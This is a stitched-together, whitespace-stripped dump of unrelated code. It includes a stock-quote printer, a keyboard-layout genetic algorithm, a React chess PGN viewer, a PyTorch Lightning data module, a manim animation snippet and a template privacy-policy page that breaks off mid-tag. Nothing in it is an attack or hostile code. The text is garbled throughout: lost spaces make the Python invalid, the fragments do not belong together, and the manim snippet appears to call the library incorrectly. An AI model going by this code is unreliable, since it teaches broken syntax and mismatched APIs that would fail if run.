ize"inquote["All"]:print("Bid(Size):"+str('{:,.2f}'.format(quote["All"]["bid"]))+"x"+str(quote["All"]["bidSize"]))ifquoteisnotNoneand"All"inquoteand"ask"inquote["All"]and"askSize"inquote["All"]:print("Ask(Size):"+str('{:,.2f}'.format(quote["All"]["ask"]))+"x"+str(quote["All"]["askSize"]))ifquoteisnotNoneand"All"inquoteand"low"inquote["All"]and"high"inquote["All"]:print("Day'sRange:"+str(quote["All"]["low"])+"-"+str(quote["All"]["high"]))ifquoteisnotNoneand"All"inquoteand"totalVolume"inquote["All"]:print("Volume:"+str('{:,}'.format(quote["All"]["totalVolume"])))else:#HandleerrorsifdataisnotNoneand'QuoteResponse'indataand'Messages'indata["QuoteResponse"]\and'Message'indata["QuoteResponse"]["Messages"]\anddata["QuoteResponse"]["Messages"]["Message"]isnotNone:forerror_messageindata["QuoteResponse"]["Messages"]["Message"]:print("Error:"+error_message["description"])else:print("Error:QuoteAPIserviceerror")else:logger.debug("ResponseBody:%s",response)print("Error:QuoteAPIserviceerror")//Next.jsAPIroutesupport:https://nextjs.org/docs/api-routes/introductionexportdefaultfunctionhandler(req,res){res.status(200).json({name:'JohnDoe'})}//Next.jsAPIroutesupport:https://nextjs.org/docs/api-routes/introductionexportdefaultfunctionhandler(req,res){res.status(200).json({name:'JohnDoe'})}constSidebarItem=({title,href,active})=>{return(<liclassName={`mb-2${active?'text-gray-900':''}`}><ahref={href}className={`flexfont-mediumitems-centergap-2p-2rounded-lg${active?'bg-[#EEEFFC]text-gray-900font-semibold':'text-gray-700hover:bg-[#EEEFFC]'}transition-colorsduration-200ease-out`}>{title}</a></li>);};exportdefaultSidebarItem;fromvisualizeimportLayoutVisualizerfromstringimportascii_lowercase,ascii_uppercase,digits,punctuationimportnumpyasnpimportrandomimportpicklefromenumimportEnumimportrandomfromstringimportascii_lowercase,ascii_uppercase,digits,punctuationcase_map=dict(zip(ascii_lowercase,ascii_uppercase))classHand(Enum):LEFT=0RIGHT=1classFinger(Enum):INDEX_LEFT=1MIDDLE_LEFT=2RING_LEFT=3PINKY_LEFT=4INDEX_RIGHT=5MIDDLE_RIGHT=6RING_RIGHT=7PINKY_RIGHT=8finger_map={Finger.PINKY_LEFT:[0,1,2,3,26,27,52,53,74,75],Finger.RING_LEFT:[4,5,28,29,54,55,76,77],Finger.MIDDLE_LEFT:[6,7,30,31,56,57],Finger.INDEX_LEFT:[8,9,10,11,32,33,34,35,58,59,60,61,78,79,80,81,82,83],Finger.INDEX_RIGHT:[12,13,14,15,36,37,38,39,62,63,64,65,84,85,86,87],Finger.MIDDLE_RIGHT:[16,17,40,41,66,67,88,89],Finger.RING_RIGHT:[18,19,42,43,44,45,68,69,90,91],Finger.PINKY_RIGHT:[20,21,22,23,24,25,46,47,48,49,50,51,70,71,72,73,92,93]}finger_map={key:[kfork,vinfinger_map.items()ifkeyinv][0]forkeyinrange(94)}hand_map={Finger.PINKY_LEFT:Hand.LEFT,Finger.RING_LEFT:Hand.LEFT,Finger.MIDDLE_LEFT:Hand.LEFT,Finger.INDEX_LEFT:Hand.LEFT,Finger.INDEX_RIGHT:Hand.RIGHT,Finger.MIDDLE_RIGHT:Hand.RIGHT,Finger.RING_RIGHT:Hand.RIGHT,Finger.PINKY_RIGHT:Hand.RIGHT}classKey:def__init__(self,base,shift):self.base=baseself.shift=shiftdef__repr__(self):returnf'Key({self.base},{self.shift})'def__eq__(self,other):returnisinstance(other,Key)andself.base==other.baseandself.shift==other.shiftdef__hash__(self):returnhash((self.base,self.shift))classLayout:special_chars=list(digits+punctuation)def__init__(self,keys=None):ifkeysisnotNone:ifisinstance(keys,str):self.keys=[]i=0while(i<len(keys)):if(keys[i]inascii_lowercase):self.keys.append(Key(keys[i],keys[i].upper()))else:self.keys.append(Key(keys[i],keys[i+1]))i+=1i+=1else:self.keys=keyselse:self.randomize()self.set_expanded()self.fitness=Nonedef__repr__(self):return'['+''.join(map(str,self.keys))+']'defset_expanded(self):self.expanded=[]forkeyinself.keys:self.expanded.extend([key.base,key.shift])defvalidate(self):assertlen(self.keys)==47assertlen(set(self.keys))==len(self.keys)deftranslate(self,text:str,layout)->str:translated_text=[]forcharintext:if(char==''):translated_text.append('')continueidx=self.expanded.index(char)translated_text.append(layout.expanded[idx])return''.join(translated_text)@staticmethoddefcrossover(a,b):child_keys=[None]*len(a.keys)assigned_letters=set()letter_positions=[]#Firstpass:Assignletterkeysforiinrange(len(a.keys)):a_is_letter=a.keys[i].baseinascii_lowercaseb_is_letter=b.keys[i].baseinascii_lowercaseifa_is_letterandb_is_letter:#Bothareletterkeysifrandom.random()<0.5:letter=a.keys[i].baseelse:letter=b.keys[i].baseelifa_is_letter:letter=a.keys[i].baseelifb_is_letter:letter=b.keys[i].baseelse:continue#Skipifneitherisaletterkeyifletternotinassigned_letters:child_keys[i]=Key(base=letter,shift=case_map[letter])assigned_letters.add(letter)letter_positions.append(i)#Collectremaininglettersnotyetassignedremaining_letters=set(ascii_lowercase)-assigned_lettersremaining_positions=[iforiinrange(len(child_keys))ifchild_keys[i]isNone]random.shuffle(remaining_positions)forletter,iinzip(remaining_letters,remaining_positions):child_keys[i]=Key(base=letter,shift=case_map[letter])assigned_letters.add(letter)letter_positions.append(i)#Secondpass:Assignspecialkeysspecial_positions=[iforiinrange(len(child_keys))ifchild_keys[i]isNone]special_keys_pool=[kforkin(a.keys+b.keys)ifk.basenotinascii_lowercase]used_special_keys=set()foriinspecial_positions:forkinspecial_keys_pool:ifknotinused_special_keys:child_keys[i]=kused_special_keys.add(k)break#IfanypositionsarestillNone,createrandomspecialkeyswhileNoneinchild_keys:i=child_keys.index(None)base=random.choice(Layout.special_chars)shift=random.choice(Layout.special_chars)child_keys[i]=Key(base=base,shift=shift)#Createthenewchildlayoutchild=Layout(keys=child_keys)child.set_expanded()returnchilddefmutate(self,mutation_rate=0.1):ifrandom.random()<mutation_rate:i,j=random.sample(range(len(self.keys)),2)#Swapentirekeystomaintainbaseandshiftpairingself.keys[i],self.keys[j]=self.keys[j],self.keys[i]#Re-pairthespecialkeysaftermutationself.repair_special_keys()#Updatetheexpandedrepresentationself.set_expanded()defrepair_special_keys(self):#Collecttheindicesofspecialkeysspecial_key_indices=[idxforidx,keyinenumerate(self.keys)ifkey.basenotinascii_lowercase]#Usetheclassvariablespecial_charsspecial_chars=self.special_chars.copy()random.shuffle(special_chars)#Ensurethenumberofspecialcharactersiseveniflen(special_chars)%2!=0:special_chars.append('')#Addaplaceholderifnecessary#Pairupspecialcharacterstocreatespecialkeysspecial_keys=[]foriinrange(0,len(special_chars),2):base=special_chars[i]shift=special_chars[i+1]special_keys.append(Key(base=base,shift=shift))#Nowassignspecial_keystothepositionsinself.keysnum_special_keys_needed=len(special_key_indices)special_keys=special_keys[:num_special_keys_needed]foridx,new_keyinzip(special_key_indices,special_keys):self.keys[idx]=new_keydefrandomize(self):letter_keys=[Key(base,shift)forbase,shiftinzip(ascii_lowercase,ascii_uppercase)]special_chars=self.special_chars.copy()random.shuffle(special_chars)#Ensurethenumberofspecialcharactersiseveniflen(special_chars)%2!=0:special_chars.append('')#Addaplaceholderifnecessary#Pairupspecialcharacterstocreatespecialkeysspecial_keys=[]foriinrange(0,len(special_chars),2):base=special_chars[i]shift=special_chars[i+1]special_keys.append(Key(base=base,shift=shift))#Combineallkeysintoasinglelistall_keys=letter_keys+special_keys#Shuffleallkeystorandomizetheirpositionsrandom.shuffle(all_keys)self.keys=all_keysdefset_fitness(self,corpus):self.fitness=0#getthefingerusedtotypethefirstletterofthecorpusprevious_finger=finger_map[self.expanded.index(corpus[0])]previous_hand=hand_map[previous_finger]forcharincorpus[1:]:position=self.expanded.index(char)finger=finger_map[position]hand=hand_map[finger]#reachingforthe+2rowisreallybadif(position<=25):self.fitness-=40#reachingforthe+-1rowisbadelif(26<=position<=51):self.fitness-=1elif(74<=position):self.fitness-=1#pinkystretchingisreallybadif(positionin{0,1,2,3,22,23,24,25,48,40,50,51}):self.fitness-=60#usingthesamefingertwiceisbadif(finger==previous_finger):self.fitness-=10previous_finger=finger#alternatinghandsisgoodif(hand!=previous_hand):self.fitness+=0.5self.fitness/=len(corpus)/100defvisualize(self):visualizer=LayoutVisualizer(self,'template.png')visualizer.visualize()defdump(self,path):withopen(path,'wb')asf:pickle.dump(self,f)colemak=Layout("""`~1!2@3#4$5%6^7&8*9(0)-_=+qwfpgjluy;:[{]}\|arstdhneio'"zxcvbkm,<.>/?""")qwerty=Layout("""`~1!2@3#4$5%6^7&8*9(0)-_=+qwertyuiop[{]}\|asdfghjkl;:'"zxcvbnm,<.>/?""")import{useState,useEffect}from'react';import{Chessboard}from'react-chessboard';import{Chess}from'chess.js';importmoveSoundfrom'../public/move-sound.mp3';import{ProgressBar}from'./ProgressBar';constBoard=({comments})=>{const[pgn,setPgn]=useState(`[Event"LiveChess"][Site"Chess.com"][Date"2023.04.14"][Round"-"][White"rajbedi"][Black"ShiBoGod"][Result"1-0"][WhiteElo"1394"][BlackElo"1398"][TimeControl"600"][EndTime"22:22:45PDT"][Termination"rajbediwonbyresignation"]1.e4c62.d4d53.e5Bf54.Bd3Bxd35.Qxd3e66.Qb3Qb67.Qxb6axb68.Nf3c59.Be3Nc610.dxc5bxc511.O-ONge712.c3Nf513.Na3Nxe314.fxe3c415.Nb5Rc816.Ng5f517.exf6gxf618.Rxf6Bc519.Rxe6+Kd720.Kh1Bxe321.Rxe3Rhf822.h3Rf523.Nxh7Rh824.Rf3Rh525.Nf6+1-0`);const[moveSoundEffect,setMoveSoundEffect]=useState(null);useEffect(()=>{setMoveSoundEffect(newAudio(moveSound));},[moveSound]);const[boardOrientation,setBoardOrientation]=useState('white');constflipBoard=()=>{setBoardOrientation(boardOrientation==='white'?'black':'white');}constgetFenArr=(board)=>{consttempBoard=newChess();returnboard.history().map((move)=>{tempBoard.move(move);returntempBoard.fen();});};const[fen,setFen]=useState('start');const[imove,setImove]=useState(0);constboard=newChess();board.loadPgn(pgn);constfenArr=['start',...getFenArr(board)];consthandleKeyDown=(e)=>{letnewI=imove;switch(e.key){case'ArrowRight':newI=Math.min(imove+1,fenArr.length-1);moveSoundEffect?.play();//playmovesoundeffectbreak;case'ArrowLeft':newI=Math.max(imove-1,0);moveSoundEffect?.play();//playmovesoundeffectbreak;case'ArrowUp':newI=0;break;case'ArrowDown':newI=fenArr.length-1;break;case'x':flipBoard();break;default:break;}setImove(newI);setFen(fenArr[newI]);};consthandleSubmit=(e)=>{e.preventDefault();constformData=newFormData(e.target);constnewPgn=formData.get('pgn');setPgn(newPgn);setImove(0);setFen('start');};return(<divclassName=''><formclassName='flexcontent-centerspace-x-2mt-5mb-5'onSubmit={handleSubmit}><inputclassName='px-3py-2borderborder-gray-300rounded-lgfocus:outline-nonefocus:ring-2focus:ring-green-500'id='pgn-input'name='pgn'type='text'placeholder='EnterPGN'/><buttonclassName='px-4py-2rounded-fullbg-green-100hover:bg-green-200focus:outline-none'type='submit'>Submit</button></form><divid='board'className='w-6/12lg:w-5/12'tabIndex={0}onKeyDown={handleKeyDown}><ChessboardarePiecesDraggable={false}position={fen}boardOrientation={boardOrientation}id='chessboard'/><divid='progress-bar-div'><ProgressBarfenArr={fenArr}imove={imove}comments={comments}></ProgressBar></div></div></div>);};exportdefaultBoard;fromtypingimportOptionalimporttorchdata.datapipes.iterimportwebdatasetaswdsfromomegaconfimportDictConfigfrompytorch_lightningimportLightningDataModuletry:fromsdataimportcreate_dataset,create_dummy_dataset,create_loaderexceptImportErrorase:print("#"*100)print("Datasetsnotyetavailable")print("toenable,weneedtoaddstable-datasetsasasubmodule")print("pleaseuse``gitsubmoduleupdate--init--recursive``")print("anddo``pipinstall-estable-datasets/``fromtherootofthisrepo")print("#"*100)exit(1)classStableDataModuleFromConfig(LightningDataModule):def__init__(self,train:DictConfig,validation:Optional[DictConfig]=None,test:Optional[DictConfig]=None,skip_val_loader:bool=False,dummy:bool=False,):super().__init__()self.train_config=trainassert("datapipeline"inself.train_configand"loader"inself.train_config),"trainconfigrequiresthefields`datapipeline`and`loader`"self.val_config=validationifnotskip_val_loader:ifself.val_configisnotNone:assert("datapipeline"inself.val_configand"loader"inself.val_config),"validationconfigrequiresthefields`datapipeline`and`loader`"else:print("Warning:NoValidationdatapipelinedefined,usingthatonefromtraining")self.val_config=trainself.test_config=testifself.test_configisnotNone:assert("datapipeline"inself.test_configand"loader"inself.test_config),"testconfigrequiresthefields`datapipeline`and`loader`"self.dummy=dummyifself.dummy:print("#"*100)print("USINGDUMMYDATASET:HOPEYOU'REDEBUGGING;)")print("#"*100)defsetup(self,stage:str)->None:print("Preparingdatasets")ifself.dummy:data_fn=create_dummy_datasetelse:data_fn=create_datasetself.train_datapipeline=data_fn(**self.train_config.datapipeline)ifself.val_config:self.val_datapipeline=data_fn(**self.val_config.datapipeline)ifself.test_config:self.test_datapipeline=data_fn(**self.test_config.datapipeline)deftrain_dataloader(self)->torchdata.datapipes.iter.IterDataPipe:loader=create_loader(self.train_datapipeline,**self.train_config.loader)returnloaderdefval_dataloader(self)->wds.DataPipeline:returncreate_loader(self.val_datapipeline,**self.val_config.loader)deftest_dataloader(self)->wds.DataPipeline:returncreate_loader(self.test_datapipeline,**self.test_config.loader)importnumpyasnpfrommanimimport*classCircleAreaAnimation(Scene):defconstruct(self):num_points=50xtemp=np.linspace(-2*np.pi,2*np.pi,num_points)ytemp=(1+np.cos(xtemp))*np.sqrt((1-np.sin(xtemp))**2+np.cos(xtemp)**2)circle=Circle("Circle")circle["Center"]=Point(0,0)circle["Radius"]=1foriinrange(num_points):x=xtemp[i]y=ytemp[i]self.draw(circle("Draw"),Circle("Line"))constPrivacy=()=>{return(<divclassName='w-3/5mx-auto'><styledangerouslySetInnerHTML={{__html:"\n[data-custom-class='body'],[data-custom-class='body']*{\nbackground:transparent!important;\n}\n[data-custom-class='title'],[data-custom-class='title']*{\nfont-family:Arial!important;\nfont-size:26px!important;\ncolor:#000000!important;\n}\n[data-custom-class='subtitle'],[data-custom-class='subtitle']*{\nfont-family:Arial!important;\ncolor:#595959!important;\nfont-size:14px!important;\n}\n[data-custom-class='heading_1'],[data-custom-class='heading_1']*{\nfont-family:Arial!important;\nfont-size:19px!important;\ncolor:#000000!important;\n}\n[data-custom-class='heading_2'],[data-custom-class='heading_2']*{\nfont-family:Arial!important;\nfont-size:17px!important;\ncolor:#000000!important;\n}\n[data-custom-class='body_text'],[data-custom-class='body_text']*{\ncolor:#595959!important;\nfont-size:14px!important;\nfont-family:Arial!important;\n}\n[data-custom-class='link'],[data-custom-class='link']*{\ncolor:#3030F1!important;\nfont-size:14px!important;\nfont-family:Arial!important;\nword-break:break-word!important;\n}\n",}}/><divdata-custom-class='body'><div><strong><spanstyle={{fontSize:26}}><spandata-custom-class='title'><bdtclassName='block-component'/><bdtclassName='question'>PRIVACYPOLICY</bdt><bdtclassName='statement-end-if-in-editor'/></span></span></strong></div><div><br/></div><div><spanstyle={{color:'rgb(127,127,127)'}}><strong><spanstyle={{fontSize:15}}><spandata-custom-class='subtitle'>Lastupdated<bdtclassName='question'>March17,2024</bdt></span></span></strong></span></div><div><br/></div><div><br/></div><div><br/></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{color:'rgb(127,127,127)'}}><spanstyle={{color:'rgb(89,89,89)',fontSize:15}}><spandata-custom-class='body_text'>Thisprivacynoticefor{''}<bdtclassName='question'>EnduraScribe<bdtclassName='block-component'/></bdt>{''}(<bdtclassName='block-component'/>&quot;<strong>we</strong>,&quot;&quot;<strong>us</strong>,&quot;or&quot;<strong>our</strong>&quot;<bdtclassName='statement-end-if-in-editor'/></span><spandata-custom-class='body_text'>),describeshowandwhywemightcollect,store,use,and/orshare(<bdtclassName='block-component'/>&quot;<strong>process</strong>&quot;<bdtclassName='statement-end-if-in-editor'/>)yourinformationwhenyouuseourservices(<bdtclassName='block-component'/>&quot;<strong>Services</strong>&quot;<bdtclassName='statement-end-if-in-editor'/>),suchaswhenyou:</span></span></span><spanstyle={{fontSize:15}}><spanstyle={{color:'rgb(127,127,127)'}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span></span></span></div><ul><listyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'>Visitourwebsite<bdtclassName='block-component'/>at{''}<spanstyle={{color:'rgb(0,58,250)'}}><bdtclassName='question'><ahref='http://www.endurascribe.com'target='_blank'data-custom-class='link'>http://www.endurascribe.com</a></bdt></span><spanstyle={{fontSize:15}}><spanstyle={{color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15}}><spanstyle={{color:'rgb(89,89,89)'}}><bdtclassName='statement-end-if-in-editor'>,oranywebsiteofoursthatlinkstothisprivacynotice</bdt></span></span></span></span></span></span></span></span></li></ul><div><bdtclassName='block-component'><spanstyle={{fontSize:15}}><spanstyle={{fontSize:15}}><spanstyle={{color:'rgb(127,127,127)'}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span></span></span></span></bdt><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><spanstyle={{color:'rgb(127,127,127)'}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></span></span></span></div><ul><listyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spanstyle={{fontSize:15,color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'>Engagewithusinotherrelatedways,includinganysales,marketing,orevents<spanstyle={{fontSize:15}}><spanstyle={{color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><spanstyle={{fontSize:15}}><spanstyle={{color:'rgb(89,89,89)'}}><bdtclassName='statement-end-if-in-editor'/></span></span></span></span></span></span></span></span></li></ul><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><spanstyle={{color:'rgb(127,127,127)'}}><spandata-custom-class='body_text'><strong>Questionsorconcerns?&nbsp;</strong>Readingthisprivacynoticewillhelpyouunderstandyourprivacyrightsandchoices.Ifyoudonotagreewithourpoliciesandpractices,pleasedonotuseourServices.<bdtclassName='block-component'/>Ifyoustillhaveanyquestionsorconcerns,pleasecontactusat<bdtclassName='question'>nathandai2000@gmail.com</bdt>.</span></span></span></div><divstyle={{lineHeight:'1.5'}}><br/></div><divstyle={{lineHeight:'1.5'}}><br/></div><divstyle={{lineHeight:'1.5'}}><strong><spanstyle={{fontSize:15}}><spandata-custom-class='heading_1'>SUMMARYOFKEYPOINTS</span></span></strong></div><divstyle={{lineHeight:'1.5'}}><br/></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><strong><em>Thissummaryprovideskeypointsfromourprivacynotice,butyoucanfindoutmoredetailsaboutanyofthesetopicsbyclickingthelinkfollowingeachkeypointorbyusingour&nbsp;</em></strong></span></span><adata-custom-class='link'href='#toc'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'><strong><em>tableofcontents</em></strong></span></span></a><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><strong><em>&nbsp;belowtofindthesectionyouarelookingfor.</em></strong></span></span></div><divstyle={{lineHeight:'1.5'}}><br/></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><strong>Whatpersonalinformationdoweprocess?</strong>Whenyouvisit,use,ornavigateourServices,wemayprocesspersonalinformationdependingonhowyouinteractwithusandtheServices,thechoicesyoumake,andtheproductsandfeaturesyouuse.Learnmoreabout&nbsp;</span></span><adata-custom-class='link'href='#personalinfo'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'>personalinformationyoudisclosetous</span></span></a><spandata-custom-class='body_text'>.</span></div><divstyle={{lineHeight:'1.5'}}><br/></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><strong>Doweprocessanysensitivepersonalinformation?</strong>{''}<bdtclassName='block-component'/>Wedonotprocesssensitivepersonalinformation.<bdtclassName='else-block'/></span></span></div><divstyle={{lineHeight:'1.5'}}><br/></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><strong>Dowereceiveanyinformationfromthirdparties?</strong>{''}<bdtclassName='block-component'/>Wedonotreceiveanyinformationfromthirdparties.<bdtclassName='else-block'/></span></span></div><divstyle={{lineHeight:'1.5'}}><br/></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><strong>Howdoweprocessyourinformation?</strong>Weprocessyourinformationtoprovide,improve,andadministerourServices,communicatewithyou,forsecurityandfraudprevention,andtocomplywithlaw.Wemayalsoprocessyourinformationforotherpurposeswithyourconsent.Weprocessyourinformationonlywhenwehaveavalidlegalreasontodoso.Learnmoreabout&nbsp;</span></span><adata-custom-class='link'href='#infouse'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'>howweprocessyourinformation</span></span></a><spandata-custom-class='body_text'>.</span></div><divstyle={{lineHeight:'1.5'}}><br/></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><strong>Inwhatsituationsandwithwhich<bdtclassName='block-component'/>partiesdowesharepersonalinformation?</strong>{''}Wemayshareinformationinspecificsituationsandwithspecific{''}<bdtclassName='block-component'/>thirdparties.Learnmoreabout&nbsp;</span></span><adata-custom-class='link'href='#whoshare'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'>whenandwithwhomweshareyourpersonalinformation</span></span></a><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'>.<bdtclassName='block-component'/></span></span></div><divstyle={{lineHeight:'1.5'}}><br/></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><strong>Howdowekeepyourinformationsafe?</strong>Wehave{''}<bdtclassName='block-component'/>organizational<bdtclassName='statement-end-if-in-editor'/>andtechnicalprocessesandproceduresinplacetoprotectyourpersonalinformation.However,noelectronictransmissionovertheinternetorinformationstoragetechnologycanbeguaranteedtobe100%secure,sowecannotpromiseorguaranteethathackers,cybercriminals,orother<bdtclassName='block-component'/>unauthorized<bdtclassName='statement-end-if-in-editor'/>thirdpartieswillnotbeabletodefeatoursecurityandimproperlycollect,access,steal,ormodifyyourinformation.Learnmoreabout&nbsp;</span></span><adata-custom-class='link'href='#infosafe'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'>howwekeepyourinformationsafe</span></span></a><spandata-custom-class='body_text'>.</span><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='statement-end-if-in-editor'/></span></span></div><divstyle={{lineHeight:'1.5'}}><br/></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><strong>Whatareyourrights?</strong>Dependingonwhereyouarelocatedgeographically,theapplicableprivacylawmaymeanyouhavecertainrightsregardingyourpersonalinformation.Learnmoreabout&nbsp;</span></span><adata-custom-class='link'href='#privacyrights'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'>yourprivacyrights</span></span></a><spandata-custom-class='body_text'>.</span></div><divstyle={{lineHeight:'1.5'}}><br/></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><strong>Howdoyouexerciseyourrights?</strong>Theeasiestwaytoexerciseyourrightsisby<bdtclassName='block-component'>submittinga&nbsp;</bdt></span></span><adata-custom-class='link'href='https://app.termly.io/notify/8e93c823-d220-4b99-b0fe-c1eaae946717'rel='noopenernoreferrer'target='_blank'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'>datasubjectaccessrequest</span></span></a><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='block-component'/>,orbycontactingus.Wewillconsiderandactuponanyrequestinaccordancewithapplicabledataprotectionlaws.</span></span></div><divstyle={{lineHeight:'1.5'}}><br/></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'>Wanttolearnmoreaboutwhatwedowithanyinformationwecollect?&nbsp;</span></span><adata-custom-class='link'href='#toc'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'>Reviewtheprivacynoticeinfull</span></span></a><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'>.</span></span></div><divstyle={{lineHeight:'1.5'}}><br/></div><divstyle={{lineHeight:'1.5'}}><br/></div><divid='toc'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><spanstyle={{color:'rgb(127,127,127)'}}><spanstyle={{color:'rgb(0,0,0)'}}><strong><spandata-custom-class='heading_1'>TABLEOFCONTENTS</span></strong></span></span></span></div><divstyle={{lineHeight:'1.5'}}><br/></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><adata-custom-class='link'href='#infocollect'><spanstyle={{color:'rgb(0,58,250)'}}>1.WHATINFORMATIONDOWECOLLECT?</span></a></span></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><adata-custom-class='link'href='#infouse'><spanstyle={{color:'rgb(0,58,250)'}}>2.HOWDOWEPROCESSYOURINFORMATION?<bdtclassName='block-component'/></span></a></span></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><spanstyle={{color:'rgb(0,58,250)'}}><adata-custom-class='link'href='#whoshare'>3.WHENANDWITHWHOMDOWESHAREYOURPERSONALINFORMATION?</a></span><spandata-custom-class='body_text'><bdtclassName='block-component'/><spanstyle={{color:'rgb(127,127,127)'}}><spanstyle={{color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)'}}><bdtclassName='block-component'/></span></span><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)'}}><spanstyle={{color:'rgb(89,89,89)'}}><spanstyle={{color:'rgb(89,89,89)'}}><bdtclassName='block-component'/></span></span><bdtclassName='block-component'/></span></span></span></span></span></span></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><adata-custom-class='link'href='#inforetain'><spanstyle={{color:'rgb(0,58,250)'}}>4.HOWLONGDOWEKEEPYOURINFORMATION?</span></a><spanstyle={{color:'rgb(127,127,127)'}}><spanstyle={{color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)'}}><spanstyle={{color:'rgb(89,89,89)'}}><bdtclassName='block-component'/></span></span></span></span></span></span></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><adata-custom-class='link'href='#infosafe'><spanstyle={{color:'rgb(0,58,250)'}}>5.HOWDOWEKEEPYOURINFORMATIONSAFE?</span></a><spanstyle={{color:'rgb(127,127,127)'}}><spanstyle={{color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)'}}><bdtclassName='statement-end-if-in-editor'/><bdtclassName='block-component'/></span></span></span></span></span></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><adata-custom-class='link'href='#infominors'><spanstyle={{color:'rgb(0,58,250)'}}>6.DOWECOLLECTINFORMATIONFROMMINORS?</span></a><spanstyle={{color:'rgb(127,127,127)'}}><spanstyle={{color:'rgb(89,89,89)'}}><spandata-custom-class='body_text'><spanstyle={{color:'rgb(89,89,89)'}}><bdtclassName='statement-end-if-in-editor'/></span></span></span></span></span></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><spanstyle={{color:'rgb(0,58,250)'}}><adata-custom-class='link'href='#privacyrights'>7.WHATAREYOURPRIVACYRIGHTS?</a></span></span></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><adata-custom-class='link'href='#DNT'><spanstyle={{color:'rgb(0,58,250)'}}>8.CONTROLSFORDO-NOT-TRACKFEATURES<bdtclassName='block-component'/></span></a></span></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><adata-custom-class='link'href='#uslaws'><spanstyle={{color:'rgb(0,58,250)'}}>9.DOUNITEDSTATESRESIDENTSHAVESPECIFICPRIVACYRIGHTS?</span></a></span><bdtclassName='block-component'><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'/></span></bdt></div><divstyle={{lineHeight:'1.5'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}/></bdt><bdtclassName='block-component'/><bdtclassName='block-component'/><bdtclassName='block-component'/><bdtclassName='block-component'/><bdtclassName='block-component'/><bdtclassName='block-component'/><bdtclassName='block-component'/><bdtclassName='block-component'/><bdtclassName='block-component'/></div><divstyle={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><adata-custom-class='link'href='#policyupdates'><spanstyle={{color:'rgb(0,58,250)'}}>10.DOWEMAKEUPDATESTOTHISNOTICE?</span></a></span></div><divstyle={{lineHeight:'1.5'}}><adata-custom-class='link'href='#contact'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}>11.HOWCANYOUCONTACTUSABOUTTHISNOTICE?</span></a></div><divstyle={{lineHeight:'1.5'}}><adata-custom-class='link'href='#request'><spanstyle={{color:'rgb(0,58,250)'}}>12.HOWCANYOUREVIEW,UPDATE,ORDELETETHEDATAWECOLLECTFROMYOU?</span></a></div><divstyle={{lineHeight:'1.5'}}><